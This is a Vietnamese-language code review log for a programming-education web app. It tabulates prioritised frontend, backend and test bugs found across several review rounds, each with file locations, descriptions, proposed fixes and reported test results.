| LM-012 | `LessonStudyView.vue:293-297` | Bấm "Học bài tiếp theo" KHÔNG tắt modal → modal dính đè lên bài mới (kèm XP sai) | Đóng modal khi chuyển bài |
| LM-013 | `CoursesListView.vue:76-85` + `CourseCard.vue:65-71` | Router-link lồng nhau (anchor trong anchor) — click nút kích hoạt 2 điều hướng | 1 link duy nhất + `@click.prevent` |
| LM-014 | `useCourseStore.ts:88-118` + `CourseCard.vue:52-63` | getCourseProgress đếm qua `course.lessons` nhưng list API không trả lessons → **progress card luôn 0%**, CTA luôn "Bắt đầu" | Đếm từ localStorage lesson_progress_* theo course |
| LM-015 | `useLessonStore.ts:421-426` + `LessonStepViz.vue:60-63` | Step 2 KHÔNG bị khóa dù text "Đọc hết bài học để mở khóa" — thông điệp khóa là giả | Gate step 2 hoặc bỏ chữ hứa hẹn |
| LM-016 | `lessonCodelabFlow.spec.ts:109-155` | Test worker terminate không assert `terminate`/`postMessage` payload (hardcode kết quả, bỏ testCases/code) | Assert payload + terminate + stale requestId |
| LM-017 | `LessonStepCodeLab.vue` | **0 spec** — component chứa toàn bộ logic run/submit/allPassed/timedOut/hint | Viết lessonStepCodeLab.spec.ts |
| LM-018 | `lessonApi.ts` (toàn bộ) + type `LessonProgressResponse` | **0 spec trực tiếp** — URL/header Bearer/payload/403-404 chưa assert lần nào; interface sai shape backend (object top-level) | lessonApi.spec.ts + fix type |
| LM-019 | `lessonStudyFlow.spec.ts` | Branch 403 Premium (useLessonStore:262-263) chưa test | Thêm test 403 → message Premium |
| LM-020 | `lessonStudyFlow.spec.ts:161-196` | completeCodelab XP diff + catch awardXp reject chưa test (chỉ quiz cover) | Thêm test 2 nhánh |
| LM-021 | `useLessonStore.ts:78-83` ↔ `StatelessAuthController.cs:410-419` | **quizScore scale lệch:** frontend gửi số câu đúng (4/5), backend clamp 0..100 hiểu % → RecordQuizAttempt(4) = 4%; bestScore gửi lên không có field backend | Chốt 1 thang đo + contract test |
| LM-022 | `lessonP2Tests.spec.ts:344,353` | Fake timers không try/finally + afterEach không useRealTimers → rò timer; stub fetch trong thân test → leak stub | afterEach dọn hết |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| LM-023 | `codelabExecutor.ts:164` | worker.postMessage ngoài try → unhandled rejection + timer chạy |
| LM-024 | `codelabExecutor.ts:34-36,71` | normalizeOutput strip hết whitespace → '"a b"' ≡ '"ab"' pass giả |
| LM-025 | `learningProgressApi.ts:14-20` | Contract chết: GET/POST /learning-progress không tồn tại backend → 404 im lặng |
| LM-026 | `ClassroomProgressService.cs:58-99` | N+1: IsModuleLocked/IsItemUnlocked trong vòng lặp → 100 item ≈ 200 query |
| LM-027 | `ClassroomProgressService.cs:230-231` | newlyUnlocked/previouslyUnlocked gọi cùng query → dead logic |
| LM-028 | `CourseController.cs:240-244` + `LessonController.cs:85-92` | Heuristic quiz link sai: lesson1(1000), lesson2(2000), quiz(3000) → CẢ 2 lesson nhận quiz |
| LM-029 | `CourseController.cs:607-622` | GetCourseAnalytics NRE khi Lesson null/IsDeleted |
| LM-030 | `useLessonStore.ts:170-172` | Retry 10s sync theo bài ĐANG MỞ không phải bài lỗi → loop vô hạn khi server chết + bài cũ không retry |
| LM-031 | `useLessonStore.ts:429-443` | loadCourseDetail không race-token → course cũ ghi đè |
| LM-032 | `useCourseStore.ts:51-68` | loadCourses không race-guard/reload đổi user/pagination search |
| LM-033 | `CourseController.cs:315,346` | AddModule/AddModuleItem không catch unique OrderIndex → 500 |
| LM-034 | `useLessonStore.ts:127-139` + `LessonStepQuiz.vue:150-153` | Quiz "Làm lại" nộp trượt → saveToLocalStorage ghi completed:false — bài đã hoàn thành bị thoái lui |
| LM-035 | `LessonStepQuiz.vue:5,61,87` | Nhãn "Mở Khóa Code Lab" kể cả khi bài không có codelab |
| LM-036 | `LessonStudyView.vue:151-160` | Nút "Hoàn thành" luôn disabled khi !nextLessonId (bài cuối) — dead button |
| LM-037 | `CourseDetailView.vue:324-328` vs `CourseSidebar.vue` | Gating premium lệch: detail → /checkout, sidebar/CTA đi thẳng vào 403 |
| LM-038 | `CoursesListView.vue:69-73,97-107` | Load fail hiện ĐỒNG THỜI empty + error state |
| LM-039 | `LessonCompletionModal.vue:1-44` | Thiếu role=dialog/aria-modal/focus trap/Esc/lock scroll/restore focus |
| LM-040 | `StepTabs.vue:3-25` + store:421-426 | Thiếu tablist/aria-selected; tab khóa click im lặng |
| LM-041 | `CourseProgressBar.vue:7-13` | Thiếu role=progressbar/aria-valuenow |
| LM-042 | `LessonStepCodeLab.vue:260-287` | Monaco lỗi chỉ console.error + không skeleton loading |
| LM-043 | `LessonStepCodeLab.vue:39,58` | Badge "Cơ bản"/"1500ms" hardcode bất kể task |
| LM-044 | `LessonStudyView.vue:4-9` | FAB đè nút "Bài trước" mobile + thiếu aria-label |
| LM-045 | `LessonDiscussionPanel.vue` | Dead UI — không view nào mount (chỉ test) |
| LM-046 | `lessonStudyFlow.spec.ts` + store:217-248 | Race đổi lesson A→B (lessonLoadRequestId) **0 test** — bỏ guard suite vẫn xanh |
| LM-047 | `useLessonStore.ts:88-97,421-426` | Gating goToStep(3)/(4) + isLessonComplete các nhánh chưa test |
| LM-048 | `coursesP0Tests.spec.ts:187-205` | CR-007 sort chỉ assert length — thứ tự hỏng vẫn pass |
| LM-049 | `coursesP0Tests.spec.ts:314` | toContain('3') — số xuất hiện khắp nơi, assert vô nghĩa |
| LM-050 | `useCourseStore.spec.ts:18,33` | Fake timers 300ms tùy ý (loadCourses không có timer) |
| LM-051 | `lessonStudyFlow.spec.ts:199-255` | Mount không mock courseApi → fetch network THẬT localhost:5055 (flaky) |
| LM-052 | `courseApi.spec.ts:99-105` | Test name "trả undefined" nhưng assert toBeNull |
| LM-053 | `lessonCodelabFlow.spec.ts:130-155` | Worker contract ok:false/error shape chưa kiểm chứng qua worker thật |
| LM-054 | `coursesListView.spec.ts` + `coursesP0Tests` | Mock `as never` triệt tiêu type-check (vi phạm no-any) |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| LM-055 | `codelabExecutor.ts:146-161` | Thiếu onmessageerror → promise treo tới timeout |
| LM-056 | `lessonApi.ts:104-107` | bestScore gửi lên nhưng backend không có field (drop im lặng) |
| LM-057 | `codelabTaskRegistry.ts:111-134` | Key 'tree-traversal' nhưng task là factorial — visualizer cây + task giai thừa lệch |
| LM-058 | `codelabExecutor.ts:99-101,66-89` | Worker mới mỗi run (no pool) + timeout toàn cục (1 case treo giết hết) |
| LM-059 | `CourseController.cs:154,232` | Teacher thấy draft course bất kỳ (isTeacherOrAdmin bypass) — nên chỉ owner |
| LM-060 | `LessonController.cs:271-297` | UpdateProgress không validate LastActiveFrameIndex âm/LastScrollPercent>100 |
| LM-061 | `lessonP0Tests.spec.ts:141-148` | submitQuiz test chỉ assert quizScore — phủ chồng, dễ xanh giả |
| LM-062 | `BreadcrumbsBar.vue:7-9` | Crumb cuối pointer-events-none nhưng vẫn focusable + thiếu aria-current |
| LM-063 | `CourseDetailView.vue:101,243-257` | Đánh số bài reset theo chặng (trùng số) — sidebar đánh liên tục |
| LM-064 | `LessonStepQuiz.vue:143` | window.confirm native |
| LM-065 | `LessonCompletionModal.vue:2` | animate-fade-in không có keyframes (component không style) |
| LM-066 | `CourseCard.vue:70` | Nút luôn "Bắt đầu" dù progress > 0 (nên "Tiếp tục") |
| LM-067 | `LessonStepTheory.vue:105-111` | HTML sinh mất cân bằng <p> (không mở thẻ đầu) |
| LM-068 | `LessonStepCodeLab.vue:188-193` | Reset không chặn khi isRunning → kết quả cũ ghi đè |
| LM-069 | `CourseDetailView.vue:15-19` | Error detail không nút "Thử lại" |
| LM-070 | `lessonNavigation.spec.ts:14-55` | Không unmount wrapper giữa test |
| LM-071 | `useLessonStore.ts:193-203` | getQuizById fail giữ quiz local chưa test |

---

## 🔬 REVIEW ROUND 14 — 2026-08-11: Lesson Study / Course Modules (3 sub-agent, 42 lỗi ghi nhận)

**Scope:** frontend `stores/classroomCurriculum.ts` + `views/teacher/TeacherClassroomCurriculumTab.vue` + `views/teacher/components/ModuleItemRow.vue` + 4 modal (ModuleForm/ItemForm/OverrideSettings/ImportCourse) + `views/classroom/components/StudentCurriculumSidebar.vue` + `views/classroom/StudentClassroomView.vue` + CourseSidebar · backend `ClassroomCurriculumController.cs` + 14 command/query handler + ClassroomProgressService + UnlockRuleEngine.
**Phương pháp:** 3 góc nhìn (Logic+Backend / UI-UX / Test-Integration) — đã khử trùng lặp, ID LS-001→042 (P0=5, P1=17, P2=12, P3=8). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Backend / Frontend / Tests). Kết quả: backend **552/552 PASS** (+45), frontend **3129/3129 PASS** (170 files, +43), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 14.

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| LS-001 | `classroomCurriculum.ts:4-19` | **Toàn bộ URL store thiếu prefix `/api/v1`** (BASE_URL=localhost:5055, backend serve api/v1/...) → mọi CRUD curriculum **404**; không test bắt (store bị vi.mock 100%) | Sửa prefix + integration test so URL với controller route |
| LS-002 | `classroomCurriculum.ts:293-304` ↔ `ClassroomCurriculumController.cs` | `updateItemApi`/`deleteItemApi` gọi endpoint **không tồn tại** (controller chỉ có POST items + PUT reorder; thiếu Update/DeleteClassroomModuleItem command) → sửa/ẩn/xóa bài 404 | Thêm 2 endpoint + handler |
| LS-003 | `TeacherClassroomCurriculumTab.vue:456-475` + store:229-251 | **Reorder drag-drop không wire**: onDropModule/onDropItem/handleDragEnd đều rỗng; ModuleItemRow emit drop không ai nghe; store có sẵn reorderModulesApi/reorderItemsApi/applyDragDrop nhưng không gọi; 2 hệ drag trùng (dnd-kit + HTML5) | Nối event chain + bỏ 1 hệ |
| LS-004 | `ImportCourseModal.vue:304-313` ↔ backend | Import gọi POST `/classrooms/{teacherId}/import-course` — **sai path segment + backend không có endpoint import-course** (handler tồn tại nhưng không controller nào gọi) → luôn 404 | Thêm route + sửa URL FE |
| LS-005 | `ItemFormModal.vue:254-257` | `linkedContentOptions` hardcode `return []` → không chọn được Lesson/Quiz/Codelab, isValid luôn false → **nút "Tạo Bài học" khóa vĩnh viễn** | Nạp danh sách từ API/prop |

### 🟠 P1

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| LS-006 | `CreateClassroomModuleItemCommandHandler.cs:69-84` | Truyền positional lệch: request.IsHidden rơi vào isHiddenForStudent → "ẩn" lưu sai field |
| LS-007 | `GetStudentClassroomCurriculumQueryHandler.cs:30-40` + sidebar:117 | Student query chỉ lọc IsHiddenForStudent, không lọc module.IsHidden/item.IsHidden → bài ẩn vẫn hiển thị "Đã khóa"; IsHiddenForStudent không ai set |
| LS-008 | `ClassroomProgressService.cs:51` | `ToDictionary(p => p.ModuleItemId)` với PK composite (UserId, ModuleItemId, AttemptNumber) → ≥2 attempt = **500 /my-progress** |
| LS-009 | Override chain: modal → tab → store → `UpdateClassroomModuleItemOverrideCommand.cs:17-20` → query | **Override đứt 3 tầng**: UI gọi updateItemApi (404) thay vì override endpoint; command chỉ nhận 4 field (thiếu prerequisiteItemId/isSequential/isRequired); 2 query handler không merge overrides → override lưu xong không hiện lại |
| LS-010 | `ClassroomUnlockRuleEngine.cs:45-56,124-136` + sidebar:201-216 | Khóa vĩnh viễn: (1) engine đếm item ẩn vào requiredItems; (2) isModuleCompleted false khi module không có item required |
| LS-011 | `TeacherClassroomCurriculumTab.vue:253` vs `TeacherPanelView.vue:36` | Đọc route.params.id nhưng không defineProps → prop classroomId bị bỏ qua → fetch `undefined` → 404 + empty state nhầm |
| LS-012 | `StudentCurriculumSidebar.vue:225-233` | Sequential lock bỏ qua: isSequential && prerequisiteItemId → return false (luôn mở); bỏ qua field isUnlocked backend trả về |
| LS-013 | `ModuleItemRow.vue` (emit duplicate) | Nút "Nhân bản" no-op — dead UI |
| LS-014 | `TeacherClassroomCurriculumTab.vue:283-289,353-385` | Không error state: curriculumStore.error không render, save/delete không try/catch → unhandled rejection + modal đóng im lặng |
| LS-015 | `TeacherClassroomCurriculumTab.vue:392-413` | "Xóa lớp học" dùng confirm()/alert() + fetch thô trong khi có ConfirmModal sẵn |
| LS-016 | `OverrideSettingsModal.vue:190-241` ↔ store | Mismatch field: modal emit isHiddenForStudent, interface dùng isHidden → toggle không persist |
| LS-017 | (thiếu file) | **Store classroomCurriculum 0 spec** — load/CRUD/reorder/override/race 2 classroom chưa test |
| LS-018 | (thiếu file) | **StudentCurriculumSidebar + StudentClassroomView 0 test** — unlock/progress/overall/clock thật |
| LS-019 | ModuleItemRow + 4 modal | Không spec riêng — CRUD/override UI không assert store call |
| LS-020 | `teacherP2Tests.spec.ts:653-667,682-703` | Test pass giả: classroomId chỉ assert text; vi.doMock vue-router sau import không hiệu lực; mock curriculum:null cố định → empty-state test không phải branch thật |
| LS-021 | (thiếu file) | Backend thiếu GetStudentClassroomCurriculumQueryHandlerTests + teacher handler thiếu filter/sort/progress/IsUnlocked tests |
| LS-022 | (thiếu file) | Backend thiếu controller tests — UnauthorizedAccessException → **500 thay vì 403/404** (chỉ DeleteModule/GetIntegrityReport có catch) |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| LS-023 | `ReorderClassroomModuleItemsCommandHandler.cs:35-42` | Không atomic: item ngoài ItemOrders không đánh số lại (duplicate order); itemId module khác bỏ im lặng |
| LS-024 | `UpdateClassroomModuleItemOverrideCommand.cs:17-20` | Thiếu field + không validate ModuleItem thuộc Classroom (teacher gán override item lớp khác) |
| LS-025 | `progressP2Tests.spec.ts:1086-1124` (LN-001) | Smoke vô nghĩa: mount stub hết child, chỉ assert exists() — không assert tab nào |
| LS-026 | `ModuleItemRow.vue:18-26` | Drag handle button không keyboard (thiếu KeyboardSensor) + aria English |
| LS-027 | `StudentCurriculumSidebar.vue:71-81` | Item row div @click — không role/tabindex/keyboard; locked vẫn hover pointer |
| LS-028 | `StudentCurriculumSidebar.vue:168-190` | Không scroll-active/auto-expand module chứa currentItemId |
| LS-029 | `StudentClassroomView.vue:14` | Sidebar w-80 cố định không toggle → vỡ layout mobile |
| LS-030 | `ModuleItemRow.vue:167-174` + sidebar:94-108 | Item type CustomLesson không case → badge-default xám, displayTitle không fallback |
| LS-031 | `CourseSidebar.vue:32-40,114-118` | Bài premium không lock icon — click xong mới redirect /checkout bất ngờ |
| LS-032 | `ItemFormModal.vue:162-175` + `OverrideSettingsModal.vue:35-48` | Prerequisite select liệt kê item đang edit → tự chọn mình (circular) |
| LS-033 | `TeacherClassroomCurriculumTab.vue:73-77,416-433` | Accordion draggable toàn bộ (kéo nhầm khi bấm) + @dragleave flicker khi qua child |
| LS-034 | `TeacherClassroomCurriculumTab.css:1-23` + sidebar css:92-97 | module-hidden/animate-slide-down dùng trong template nhưng không có CSS |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| LS-035 | `LessonStudyView.vue:180-183,445-452` | Discussion panel bên phải nhưng transition slide-left (ngược hướng) |
| LS-036 | `LessonStudyView.vue:4-10` | Toggle sidebar z-50 đè overlay + sidebar mobile |
| LS-037 | `CourseSidebar.vue:26-67,69-71` | Thiếu aria-current/aria-label; empty state luôn "Đang tải..." |
| LS-038 | `StepTabs.vue:2-21` | ARIA tab chưa đủ (aria-controls, roving tabindex, tabpanel) + cursor-pointer+not-allowed mâu thuẫn |
| LS-039 | `LessonStudyView.vue:323-332` | Breadcrumb lesson thiếu ?courseId → mất context |
| LS-040 | `TeacherClassroomCurriculumTab.vue:464-466,154` | Dead code: onDragOverModuleForItem, ref itemsContainer, watch tách cuối file |
| LS-041 | `classroomCurriculum.ts:67,274` | saving không bao giờ set true → :disabled vô tác dụng (không guard double-submit) |
| LS-042 | `ClassroomCurriculumController.cs:241` | Route modules/reorder thiếu :guid constraint |

---

## 🔬 REVIEW ROUND 15 — 2026-08-11: Teacher Panel (3 sub-agent, 47 lỗi ghi nhận)

**Scope:** `views/teacher/**` (TeacherPanelView + 8 tab + 12 modal + useTeacherApi/useQuizBuilder) · backend `TeacherController.cs`/`QuizzesController.cs`/`StatelessQuizController.cs` (manage) + UploadController + import/export.
**Phương pháp:** 3 góc nhìn (Logic+Backend / UI-UX / Test-Integration) — đã khử trùng lặp, ID TC-001→047 (P0=5, P1=15, P2=24, P3=9). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Backend / Frontend / Tests). Kết quả: backend **591/591 PASS** (+39), frontend **3184/3184 PASS** (175 files, +55), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 15. Còn lại: TC-041 PARTIAL (Student scope backend TODO).

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| TC-001 | `useQuizBuilder.ts:24-110` ↔ `QuizzesController.cs` | QuizBuilderTab CRUD gọi `/api/v1/quizzes` + `/quizzes/{id}/questions` — **endpoint không tồn tại** (chỉ GET/attempt/history) → tab không CRUD được gì; 0 spec bắt | Đổi sang `/api/v1/concepts/quiz/manage` như TeacherQuizTab hoặc gỡ tab trùng |
| TC-002 | `CodelabBuilderTab.vue:347-527` | **Toàn bộ CRUD Codelab chưa implement** — Lưu/Testcase/Template/Hint/Xóa đều `crudNotImplemented()` → alert "🚧 đang phát triển", modal không đóng, không lưu | Implement hoặc ẩn tab cho đến khi hoàn thiện |
| TC-003 | `TemplateModal.vue:22-25` + `TestCaseModal.vue:22-25` + `HintModal.vue:22-25` | Modal Testcase/Template/Hint là stub — nút "Lưu (Stub)" emit save rỗng → 2 lớp thông báo giả | Modal thật hoặc gỡ nút |
| TC-004 | `CodelabItemModal.vue:15,107` | Nút submit `form="codelab-modal-form"` ngoài form nhưng form **không có id** → bấm không submit | Gán id hoặc đưa nút vào form |
| TC-005 | `TeacherAnalyticsTab.vue:159,168,178` | URL `/api/Classroom/*` thiếu segment `v1` (backend `api/v1/classrooms`) → **toàn bộ tab Analytics 404**; test mock theo URL sai nên xanh | Sửa URL + integration test chặn 404 |

### 🟠 P1

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| TC-006 | `useQuizBuilder.ts:6` | Đọc token `localStorage.getItem('accessToken')` — key không tồn tại (token trong Pinia) → mọi request 401 |
| TC-007 | `QuizBuilderTab.vue:65,223-225` | v-for bỏ qua computed filteredQuizzes + debouncedSearch() rỗng → search/filter chết |
| TC-008 | `QuizBuilderTab.vue:95,273-275` | saveQuestion() rỗng — "Thêm câu hỏi" không lưu gì |
| TC-009 | `TeacherCourseTab.vue:279,287-289` + `CourseController.cs:680-683` | Create course gửi coverImageUrl nhưng DTO là Thumbnail → ảnh mất khi tạo; response {message, courseId} nhưng FE chờ .course → luồng sau tạo chết |
| TC-010 | `TeacherCourseTab.vue:307-313` | uploadCoverImage FormData kèm `Content-Type: application/json` → mất multipart boundary → **luôn 400 NO_FILE** |
| TC-011 | `TeacherCourseTab.vue:352-353` + `CreateDraftLessonCommandHandler.cs:36-43` | Tạo lesson gửi quizId nhưng command không có field → quiz liên kết bị bỏ rơi |
| TC-012 | `TeacherPanelView.vue:102-110` + `GetQuizAnalyticsQuery.cs` | totalQuizzes = attempts.Count (đếm lượt làm không phải số quiz) + 3 field undefined + ToListAsync kéo hết về memory |
| TC-013 | `useTeacherApi.ts:8-14` | Không 401→refresh→retry + không timeout (lệch pattern adminRequest AD-019) → token hết hạn mọi tab fail im lặng |
| TC-014 | `TheoryArticleLibraryTab.vue:223,250-254` | loadArticles luôn gán page=1 → changePage(2) bị reset → không xem trang sau |
| TC-015 | `TheoryArticleLibraryTab.vue:332-335` | restoreVersion() chỉ console.log — bấm Khôi phục không phản hồi |
| TC-016 | `TeacherPanelView.vue:92` + `TeacherCourseTab.vue:106` | Dropdown "Bài trắc nghiệm liên kết" luôn rỗng (TeacherQuizTab bị v-if unmount → ref null) |
| TC-017 | `TeacherAnalyticsTab.vue:31` vs `TeacherClassroomAnalytics.vue:34` | completionRate hiển thị 2 kiểu mâu thuẫn (0-1 vs ×100) — 0.65 hiện "0.7%" hoặc "5000%" |
| TC-018 | `TeacherQuizTab.vue:337-345` | Xóa quiz dùng confirm()/alert() native (pattern ConfirmModal đã có) |
| TC-019 | `useQuizBuilder.ts:52-77` + `QuizBuilderTab.vue:263-271` | createQuiz/updateQuiz nuốt lỗi + saveQuiz đóng modal bất chấp kết quả |
| TC-020 | toàn bộ tab teacher | Mọi fetch lỗi chỉ console.error → UI rơi vào empty state giả ("Chưa có...") |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| TC-021 | `StatelessQuizController.cs:439-512` | Quiz không OwnerId → teacher A sửa/xóa quiz teacher B (trái pattern LM-011); xpReward không validate; title trùng không chặn |
| TC-022 | `StatelessQuizController.cs:613` + DbContext:351 | DeleteQuiz hard-delete cascade → **xóa sạch attempt history + bằng chứng XP** của học viên |
| TC-023 | `LessonController.cs:260` vs CreateDraftLesson:67-69 | Update lesson OrderIndex không *1000 (lệch thang đo) |
| TC-024 | Import Excel (toàn dự án) | **Import đã bị gỡ** (ERR-257) nhưng docs/test vẫn "Done" — US-TEACH-005 chỉ test export; cần chốt giữ hay bỏ |
| TC-025 | `ImportCourseToClassroomCommandHandler.cs:70-118` | Không transaction (lỗi giữa chừng = import dở dang) + không check course ownership |
| TC-026 | `TeacherController.cs:47 vs 85-86` | Search DB dùng Contains (case-sensitive) vs in-memory OrdinalIgnoreCase → kết quả lệch 2 chế độ |
| TC-027 | `TeacherPanelView.vue:21-41` | Tabs thiếu ARIA tablist + v-if unmount → mất state/scroll/refetch mỗi lần đổi tab |
| TC-028 | toàn bộ modal teacher | Thiếu focus trap/Esc/aria-modal/scroll lock — cần ModalWrapper chung |
| TC-029 | QuizPicker/CodelabPicker/TheoryArticlePicker/VersionsModal | Icon mắt "Xem trước" no-op console.log |
| TC-030 | `TeacherQuizTab.vue:182,391-401` | Accordion sửa câu hỏi — đóng mà không lưu mất hết, không cảnh báo unsaved |
| TC-031 | `TeacherQuizTab` vs `QuizBuilderTab` | 2 tab quiz song song 2 API + 2 thang độ khó (easy/medium/hard vs 1-5) |
| TC-032 | `TeacherAnalyticsTab.vue:175-194` | Export Excel không loading/progress + lỗi im lặng |
| TC-033 | `TeacherCourseTab.vue:238,272` | category default 'sorting' không khớp option nào |
| TC-034 | (thiếu) | Backend 0 test TeacherController.GetUsers (role filter/page clamp/search/fallback) |
| TC-035 | `teacherP0Tests:228-263` + `teacherP2Tests:246-275` | Assert yếu: chỉ đếm calls > 0, không assert URL/payload/validate |
| TC-036 | `TeacherCourseTab.vue` | **0 test** CRUD course/lesson/upload/toggle; formatTopic thiếu key DataStructure/Algorithm/Sorting/Patterns/SystemDesign |
| TC-037 | `teacherP2Tests:904-911` | Student modal tiến trình chưa click test + debounce không fake timers |
| TC-038 | toàn bộ __tests__ teacher | Không test 401→refresh/403/double-submit/confirm stub |
| TC-039 | `moduleItemRow.spec.ts:148-172` + teacherP2:156-161 | 4 wrapper DOM leak giữa test + P2 stub cứng modals → coverage modal = 0 |
| TC-040 | (thiếu) | QuizBuilderTab chưa bao giờ được mount trong test |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| TC-041 | `TeacherController.cs:44` + CourseTab:151-173 | Teacher thấy mọi Student/course hệ thống (không scope classroom/owner) |
| TC-042 | `StatelessQuizController.cs:712` | GetHistory IsTeacherOrAdmin từ claim token (pattern AD-003) |
| TC-043 | `useQuizBuilder.ts` + `QuizBuilderTab.css` | Dead code filteredQuizzes/formatTopic/formatDifficulty trùng TeacherQuizTab + `any` khắp nơi |
| TC-044 | `TeacherStudentTab.vue:15-17` | Empty state "không tìm thấy" hiện cả khi chưa gõ gì |
| TC-045 | `TeacherPanelView.vue:78-83` | 4 thẻ thống kê lỗi "—" mãi không retry |
| TC-046 | `TeacherQuizTab.vue:270-280` | Form cố định 4 đáp án (QuestionFormModal cho 2-6) |
| TC-047 | `CustomLessonCreator.vue` + `CodelabItemModal.vue` | Dead component không mount (wizard 4 bước công phu không dùng) |

---

## 🔬 REVIEW ROUND 16 — 2026-08-11: Classrooms (3 sub-agent, 51 lỗi ghi nhận)

**Scope:** frontend `views/classroom/**` (MyClassroomsView, StudentClassroomView, ClassroomItemPlayer, StudentCurriculumSidebar) · backend `ClassroomController.cs`/`ClassroomProgressController.cs`/`ClassroomGradingController.cs` + JoinClassroomDtoValidator + ClassroomProgressService/UnlockRuleEngine/GradingService.
**Phương pháp:** 3 góc nhìn (Logic+Backend / UI-UX / Test-Integration) — đã khử trùng lặp, ID CR-001→051 (P0=2, P1=11, P2=18, P3=20). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Backend / Frontend / Tests). Kết quả: backend **665/665 PASS** (+74), frontend **3221/3221 PASS** (177 files, +37), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 16. **PHASE 3 HOÀN TẤT.**

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| CR-001 | `JoinClassroomDtoValidator.cs:12` + `Program.cs:74` | **Validator regex `^DSA-\d{4}-[A-Z0-9]{6}$` mâu thuẫn generator** (sinh 6 ký tự ngẫu nhiên) → **mọi code mời đều 400, join không bao giờ thành công**; không test validator bắt | Đồng bộ regex với generator + test contract |
| CR-002 | `MyClassroomsView.vue:162,183` | Gọi legacy `/api/Classroom/mine` + `/api/Classroom/join` (backend `api/v1/classrooms`) → **404 — "Lớp của tôi" + join chết hoàn toàn** | Đổi `/api/v1/classrooms/mine` + `/join` |

### 🟠 P1

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| CR-003 | `GetStudentClassroomCurriculumQuery.cs:30` + `ClassroomItemPlayer.vue:47` | DTO curriculum thiếu contentMd/sandboxType → bài Lesson trong classroom **render trống "Không có nội dung lý thuyết"** |
| CR-004 | `ClassroomItemPlayer.vue:135,105-107` | hasNext hardcode false + footer luôn "Đã hoàn thành module!" dù còn bài |
| CR-005 | `ClassroomItemPlayer.vue:9` + `StudentClassroomView.vue:71-76` | Nút back emit @back nhưng parent không lắng nghe → dead |
| CR-006 | `ClassroomItemPlayer.vue:70-73` vs sidebar:118-121 | Sidebar hiện CustomLesson nhưng player không render → dead-end "Loại bài học không được hỗ trợ" |
| CR-007 | `StudentClassroomView.vue:239-257` | complete → currentItem giữ tham chiếu cũ + sidebar không cập nhật (loadCurriculum chỉ khi newlyUnlocked) — F5 mới đúng |
| CR-008 | `StudentClassroomView.vue:140-169` | Không error state tải classroom (401/403/404/network) → "Chào mừng..." + sidebar rỗng giả; học viên bị kick vẫn thấy trang |
| CR-009 | `studentClassroomView.spec.ts:77` | Stub player → chuỗi @complete (POST complete → loadProgressSummary → loadCurriculum → navigateNext) không test; trackItemProgress cũng không |
| CR-010 | (thiếu file) | **ClassroomItemPlayer 0 spec** — nạp item/emit/nhánh Lesson/Quiz/Codelab chưa test |
| CR-011 | (thiếu file) | **MyClassroomsView 0 spec** — CR-001/CR-002 không bao giờ bị CI bắt |
| CR-012 | (thiếu file) | Backend 0 controller test Classroom/Progress/Grading (join/regenerate/kick/archive/statistics/mine/start/progress/complete) |
| CR-013 | (thiếu file) | **Grading + Analytics 0 test** (best-attempt, pass/completion rate, IDOR owner) |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| CR-014 | `JoinClassroomCommandHandler.cs:55-62` | Student bị kick vẫn rejoin được (reactivate Kicked) — kick vô nghĩa |
| CR-015 | `GetStudentClassroomCurriculumQueryHandler.cs:41-45` | Không filter Status Active → student kick/banned vẫn xem curriculum + progress |
| CR-016 | `ClassroomProgressController.cs:114-133` + engine:71-74 | unlock-status không check enrollment Active → kick vẫn nhận isUnlocked=true |
| CR-017 | `ClassroomProgressController.cs:34-43` | /my-progress 500 thay 403; 401 (middleware) vs 403 (unlocked-items) không nhất quán |
| CR-018 | `ClassroomUnlockRuleEngine.cs:252-258` | LM-026 chỉ vá ProgressService — engine vẫn loop IsItemUnlockedAsync (≈4 query/item, 100 item ≈ 400 query) |
| CR-019 | `ClassroomGradingService.cs:48-55,153-164` | Analytics đọc ModuleItems course gốc thay vì ClassroomModuleItems + CompletionRate numerator không filter IsRequired → có thể >100% |
| CR-020 | `ClassroomProgressController.cs:100-112` + Service:237 | CompleteItemRequest.Score client tự khai ghi thẳng progress — không validate |
| CR-021 | `StudentClassroomView.vue:226-237` | trackItemProgress khai báo không bao giờ gọi — lời hứa "tự động lưu tiến độ" sai |
| CR-022 | `StudentClassroomView.vue:102,163,171-181` | progressSummary fetch 2 lần nhưng không render — dead data |
| CR-023 | `ClassroomItemPlayer.vue:79-81,173-175` | Footer "Tiến độ: Đang học" kể cả khi Completed (mâu thuẫn badge sidebar) |
| CR-024 | `MyClassroomsView.vue:84 vs 176` | Join label "6 ký tự" nhưng validate chỉ chặn <4 — mã 4-5 lọt rồi lỗi server |
| CR-025 | `MyClassroomsView.vue:159-173` | Load list lỗi → empty state "Bạn chưa tham gia lớp học nào" giả |
| CR-026 | toàn bộ | **Không có tính năng Rời lớp** (không endpoint, không UI) |
| CR-027 | `StudentClassroomView.vue:37-38` + sidebar:2 | Mobile drawer: sticky top-24 lồng + 2 vùng scroll → lệch layout + double scrollbar |
| CR-028 | `TeacherClassroomAnalytics.vue:25,32-40` | grid-cols-4 không responsive + % không nhất quán 2 màn analytics |
| CR-029 | `TeacherClassroomAnalytics.vue:50-68` | Bảng không empty row (colspan) khi chưa có dữ liệu |
